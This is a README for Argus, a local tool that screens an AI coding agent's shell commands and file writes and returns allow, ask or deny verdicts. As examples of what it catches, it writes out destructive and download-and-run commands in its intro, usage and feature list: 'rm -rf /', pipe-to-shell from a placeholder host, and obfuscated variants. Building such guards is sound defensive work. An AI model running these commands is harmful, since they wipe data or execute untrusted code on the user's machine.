# Argus

> **Your AI coding agent has a shell.** `rm -rf /`, `curl … | sh`, a force-push
> to `main`, a `terraform destroy` in prod — it can run all of them. Argus sits
> in front of every command and file write, classifies it, and decides
> **allow / ask / deny** before it happens — not after.

Local-first · single static binary · pure-Go · MIT.

## Install

```bash
npm install -g @agrus/argus
argus init      # sets up ~/.argus/ and wires the Claude Code hook (idempotent)
argus doctor    # confirm it's healthy
```

Prebuilt for macOS & Linux (arm64/x64); anywhere else:
`go install github.com/lucasngucii/argus/cmd/argus@latest`.

## Use

```bash
argus explain "sudo rm -rf /"   # dry-run: why does this classify the way it does?
argus stats                     # decision digest — counts, denies, recent activity
argus serve                     # local web UI: live tail, stats, policy editor, replay
```

That's the whole integration — Claude Code now routes every Bash/Write/Edit
call through Argus.

```
$ argus explain "curl https://get.example.sh | sh"
rule: pipe-to-shell   severity: high   verdict: deny

$ argus explain "git push --force origin main"
rule: git-danger      severity: medium   verdict: ask
```

## Why it's worth having

- **A severity ladder, not a switch.** Every command is `safe`/`low`/`medium`/`high`
  — cleaning a scratch dir isn't treated like wiping `/`.
- **Parses the real shell AST — never regexed.** `sudo`, `env`, pipelines, and
  variable expansion are resolved, so obfuscation (`X=rm; $X -rf /`,
  `… | base64 -d | sh`) is seen and escalated, not bypassed.
- **A non-bypassable `high` floor.** Disk wipes, fork bombs, destructive SQL,
  credential-file writes, and catastrophic `rm` are denied in **every**
  permission mode, always — no policy edit or allowlist can lower them, and
  Argus refuses to let an agent disarm its own hook or config. Any parse or
  policy error escalates too — it's never a silent allow.
- **Research-backed ruleset.** The built-in rules trace to a cited evidence base
  (MITRE ATT&CK, OWASP, academic taxonomies, real incident postmortems) — see
  [`docs/research/`](docs/research/).
- **A local decision store, not a black box.** Every verdict is logged to
  SQLite, powering `explain`, `stats`, and **replay** — re-score your history
  against a candidate policy before you commit to it.
- **Local-first.** No SaaS, no network calls, no telemetry.

## Commands

| Command | What it does |
|---|---|
| `argus init` | Set up `~/.argus/` and wire the hook. |
| `argus doctor` | Verify the install; warns if the policy dropped baseline coverage. |
| `argus explain <cmd>` | Dry-run one command: severity, firing rule, verdict, parsed facts. |
| `argus stats [--jsonl]` | Decision digest / JSONL export. |
| `argus serve` | Local web UI (loopback-only): live tail, stats, explain, policy editor, replay. |
| `argus replay` | Re-score your logged history against a candidate policy. |
| `argus test <corpus>` | Assert `{command → severity}` — CI-friendly regression gate. |

## Policy

Rules are a schema-validated JSON file (`~/.argus/policy.json`) — editable,
versioned, and live-reloaded on every call. Writing your own rules, the full
match-field reference, and worked examples live in **[`docs/policy.md`](docs/policy.md)**.
Ready-made optional bundles (e.g. an infra-teardown guard) are in
[`docs/policy-packs/`](docs/policy-packs/).

## Web UI

`argus serve` opens a loopback-only app at `127.0.0.1:4600`: live decision tail,
severity stats, an explain box, a validate-before-save policy editor with
versioned snapshots, and a **replay** simulator (*"this policy change flips 4
past decisions"*) with close-the-loop allow/downgrade from any row. Bound to
localhost only, with anti-DNS-rebinding and CSRF protection on every mutating
route.

## Trust model

Argus is a classification layer, **not a sandbox** — it raises the bar and
creates an audit trail, it doesn't replace Claude Code's permissions or your OS
sandbox. It sees only the inline command: an interactive `psql` session's later
`DROP`, or an opaque `bash script.sh`, escalate to `ask` rather than being
inspected further.

## Development

```bash
go build ./... && go test ./...
```

Pure-Go deps only: `mvdan/sh`, `modernc.org/sqlite`, `jsonschema`. Design specs
and implementation plans live under [`docs/`](docs/).

## License

[MIT](LICENSE).
